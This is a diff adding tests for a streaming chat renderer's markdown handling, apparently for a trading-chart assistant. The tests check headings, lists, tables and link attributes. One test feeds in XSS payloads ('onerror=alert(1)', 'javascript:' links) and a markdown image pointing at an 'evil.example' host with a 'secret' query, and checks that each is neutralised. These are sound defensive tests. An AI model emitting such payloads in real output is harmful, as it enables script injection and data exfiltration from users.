@@ -75,7 +75,7 @@ describe('streaming text', async () => {
     // The fence split across two deltas, as a real stream does.
     const { listEl, chat } = fresh();
     chat.startRun();
-    chat.onText('before ``');
+    chat.onText('before\n``');
     chat.onText('`\ncode\n``');
     chat.onText('`\nafter');
     chat.endRun();
@@ -147,6 +147,116 @@ describe('streaming text', async () => {
     const want13 = 'markup <script>alert(1)</script> and <img src=x>';
     it('and reads back as the text it was', () => {
       assert.deepStrictEqual(got13, want13);
+    });
+  }
+
+  {
+    const { listEl, chat } = fresh();
+    chat.startRun();
+    stream(
+      chat,
+      [
+        '## Chart',
+        '',
+        'The **BTCUSDT** chart, *5m*, ~~1h~~:',
+        '',
+        '*   A **200-period EMA**',
+        '*   `get_chart_context`',
+        '',
+        '3. third',
+        '4. fourth',
+        '',
+        'Then:',
+        '',
+        '1. first',
+        '',
+        '> quoted',
+        '',
+        '| Level | Price |',
+        '|:--|--:|',
+        '| R1 | 84,000 |',
+        '',
+        '---',
+        'Done.',
+      ].join('\n'),
+      3,
+    );
+    chat.endRun();
+    const tags = (tag) => descendants(listEl).filter((n) => n.tagName === tag);
+    const texts = (tag) => tags(tag).map((n) => n.textContent);
+    it('headings, bold, italic and strikethrough are elements', () => {
+      assert.deepStrictEqual(texts('H2'), ['Chart']);
+      assert.deepStrictEqual(texts('STRONG'), ['BTCUSDT', '200-period EMA']);
+      assert.deepStrictEqual(texts('EM'), ['5m']);
+      assert.deepStrictEqual(texts('S'), ['1h']);
+    });
+    it('lists keep their items, and an ordered one its start', () => {
+      assert.deepStrictEqual(texts('LI'), [
+        'A 200-period EMA',
+        'get_chart_context',
+        'third',
+        'fourth',
+        'first',
+      ]);
+      assert.deepStrictEqual(tags('OL')[0].getAttribute('start'), '3');
+      assert.deepStrictEqual(tags('OL')[1].getAttribute('start'), null);
+      assert.deepStrictEqual(texts('CODE'), ['get_chart_context']);
+    });
+    it('quotes, tables and rules are elements, and alignment carries over', () => {
+      assert.deepStrictEqual(texts('BLOCKQUOTE'), ['quoted']);
+      assert.deepStrictEqual(texts('TH'), ['Level', 'Price']);
+      assert.deepStrictEqual(texts('TD'), ['R1', '84,000']);
+      assert.deepStrictEqual(tags('TD')[1].style.textAlign, 'right');
+      assert.deepStrictEqual(tags('HR').length, 1);
+    });
+    it('no markdown syntax is left in the text', () => {
+      assert.doesNotMatch(assistantText(listEl), /\*|~~|\||^#|^>/m);
+    });
+  }
+
+  {
+    const { listEl, chat } = fresh();
+    chat.startRun();
+    stream(
+      chat,
+      'a **<img src=x onerror=alert(1)>** [run](javascript:alert(1)) ' +
+        '![chart](https://evil.example/?d=secret) [plain](http://example.com)',
+      4,
+    );
+    chat.endRun();
+    it('raw HTML, unsafe links and images make no live element', () => {
+      assert.deepStrictEqual(findDangerousTag(listEl), null);
+    });
+    it('and read back as their text', () => {
+      assert.deepStrictEqual(
+        assistantText(listEl),
+        'a <img src=x onerror=alert(1)> [run](javascript:alert(1)) chart plain',
+      );
+    });
+  }
+
+  {
+    const { listEl, chat } = fresh();
+    chat.startRun();
+    stream(
+      chat,
+      'See [the docs](https://www.tradingview.com/pine-script-docs/) or https://x.com/a',
+      5,
+    );
+    chat.endRun();
+    const links = descendants(listEl).filter((n) => n.tagName === 'A');
+    it('https links open in a new tab and send no referrer', () => {
+      assert.deepStrictEqual(
+        links.map((a) => a.attrs),
+        [
+          {
+            href: 'https://www.tradingview.com/pine-script-docs/',
+            target: '_blank',
+            rel: 'noopener noreferrer',
+          },
+          { href: 'https://x.com/a', target: '_blank', rel: 'noopener noreferrer' },
+        ],
+      );
     });
   }
 
